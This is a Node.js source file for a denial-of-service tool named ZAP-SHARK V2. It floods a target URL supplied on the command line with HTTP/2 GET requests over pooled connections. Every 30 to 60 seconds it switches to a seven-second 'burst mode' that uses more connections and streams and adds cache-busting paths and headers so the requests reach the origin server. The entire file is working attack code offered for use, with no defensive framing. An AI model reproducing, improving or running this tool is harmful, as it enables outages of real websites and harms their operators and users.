const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V2 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.mode = "NORMAL"; // "NORMAL" or "BURST"
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // Connection Pools for different modes
        this.normalPool = [];
        this.burstPool = [];
        this.activePool = this.normalPool;
        
        // Mode Settings
        this.burstActive = false;
        this.burstStartTime = 0;
        this.lastBurstCycle = Date.now();
        this.burstCycleInterval = 30000 + Math.random() * 30000; // 30-60s random
        
        // Pool sizes
        this.normalPoolSize = 5;
        this.burstPoolSize = 15; // 3x more connections in burst
        
        // Stream limits
        this.normalStreamsPerConn = 50;
        this.burstStreamsPerConn = 200; // 4x more streams in burst
        
        this.activeStreams = 0;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        
        this.attackInterval = null;
        this.burstCheckInterval = null;
    }

    setupNormalConnections() {
        for (let i = 0; i < this.normalPoolSize; i++) {
            setTimeout(() => {
                try {
                    const client = http2.connect(this.targetUrl, {
                        maxSessionMemory: 8192
                    });
                    client.setMaxListeners(50);
                    this.normalPool.push(client);
                } catch (err) {}
            }, i * 200);
        }
    }

    setupBurstConnections() {
        // Destroy old burst pool
        this.burstPool.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        this.burstPool = [];
        
        // Create aggressive burst connections
        for (let i = 0; i < this.burstPoolSize; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 32768, // 4x memory
                    maxDeflateDynamicTableSize: 4294967295,
                    peerMaxConcurrentStreams: 1000
                });
                client.setMaxListeners(500);
                
                // Aggressive settings for burst
                client.settings({
                    enablePush: false,
                    initialWindowSize: 6291456, // 6MB window
                    maxConcurrentStreams: 1000
                });
                
                this.burstPool.push(client);
            } catch (err) {
                // Quick retry on burst
                if (this.burstPool.length < 5) {
                    setTimeout(() => this.setupBurstConnections(), 100);
                }
            }
        }
    }

    sendRequest() {
        const pool = this.burstActive ? this.burstPool : this.normalPool;
        if (pool.length === 0) return;

        const streamsPerConn = this.burstActive ? this.burstStreamsPerConn : this.normalStreamsPerConn;
        const maxStreams = streamsPerConn * pool.length;
        const availableStreams = maxStreams - this.activeStreams;
        
        // BURST mode sends 10x more streams per tick
        const streamsThisTick = this.burstActive ? 
            Math.min(availableStreams, 30) : // BURST: 30 streams/tick
            Math.min(availableStreams, 3);   // NORMAL: 3 streams/tick
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = pool[Math.floor(Math.random() * pool.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                // Different settings for burst
                const headers = this.burstActive ? {
                    ':method': 'GET',
                    ':path': '/?' + Date.now() + Math.random(),
                    'cache-control': 'no-cache, no-store, must-revalidate',
                    'pragma': 'no-cache'
                } : {
                    ':method': 'GET',
                    ':path': '/'
                };
                
                const req = client.request(headers);
                
                req.on('response', () => {
                    req.destroy();
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // BURST CYCLE CONTROL
    checkBurstCycle() {
        const now = Date.now();
        const timeSinceLastBurst = now - this.lastBurstCycle;
        
        // Time for next burst?
        if (timeSinceLastBurst >= this.burstCycleInterval && !this.burstActive) {
            this.activateBurstMode();
        }
        
        // Burst duration exceeded?
        if (this.burstActive && (now - this.burstStartTime) >= 7000) { // 7 seconds
            this.deactivateBurstMode();
        }
    }

    activateBurstMode() {
        console.log('\n[!] BURST MODE ACTIVATED - MAX RPS FOR 7s [!]');
        this.mode = "BURST";
        this.burstActive = true;
        this.burstStartTime = Date.now();
        
        // Prepare burst connections
        this.setupBurstConnections();
        
        // Switch to burst pool
        this.activePool = this.burstPool;
        
        // Increase attack frequency for burst
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = setInterval(() => {
                if (this.status === "ATTACKING") {
                    this.sendRequest();
                    this.updateDisplay();
                }
            }, 0.05); // 2x faster in burst
        }
    }

    deactivateBurstMode() {
        console.log('\n[~] Returning to normal mode...');
        this.mode = "NORMAL";
        this.burstActive = false;
        this.lastBurstCycle = Date.now();
        this.burstCycleInterval = 30000 + Math.random() * 30000; // New random interval
        
        // Clean up burst connections
        setTimeout(() => {
            this.burstPool.forEach(client => {
                try { client.destroy(); } catch (err) {}
            });
            this.burstPool = [];
        }, 1000);
        
        this.activePool = this.normalPool;
        
        // Return to normal speed
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = setInterval(() => {
                if (this.status === "ATTACKING") {
                    this.sendRequest();
                    this.updateDisplay();
                }
            }, 0.1);
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const modeIndicator = this.burstActive ? "🔥BURST" : "NORMAL";
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) | ${modeIndicator} | ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)}`);
    }

    // Maintenance (simplified for V2)
    checkMaintenance() {
        const currentTime = Date.now();
        if (currentTime - this.lastMaintenance >= 3600000) {
            this.status = "PAUSED";
            clearInterval(this.attackInterval);
            
            exec('ipconfig /flushdns >nul 2>&1 || true', () => {});
            
            setTimeout(() => {
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
            }, 600000);
        }
    }

    start() {
        console.log("=== ZAP-SHARK V2 - BURST MODE ===");
        console.log("Target:", this.targetUrl);
        console.log("Burst: Every 30-60s for 7s");
        console.log("=".repeat(50));
        
        this.setupNormalConnections();
        
        setTimeout(() => {
            this.attackInterval = setInterval(() => {
                if (this.status === "ATTACKING") {
                    this.sendRequest();
                    this.updateDisplay();
                }
            }, 0.1);
            
            // Burst cycle checker
            this.burstCheckInterval = setInterval(() => {
                this.checkBurstCycle();
            }, 1000);
            
            // Maintenance checker
            setInterval(() => {
                this.checkMaintenance();
            }, 10000);
            
        }, 2000);
        
        process.on('SIGINT', () => {
            this.running = false;
            clearInterval(this.attackInterval);
            clearInterval(this.burstCheckInterval);
            console.log('\n=== ZAP-SHARK V2 STOPPED ===');
            process.exit(0);
        });
    }
}

// Usage
const target = process.argv[2];
if (!target) {
    console.log('Usage: node zap-shark-v2.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V2(target);
shark.start();
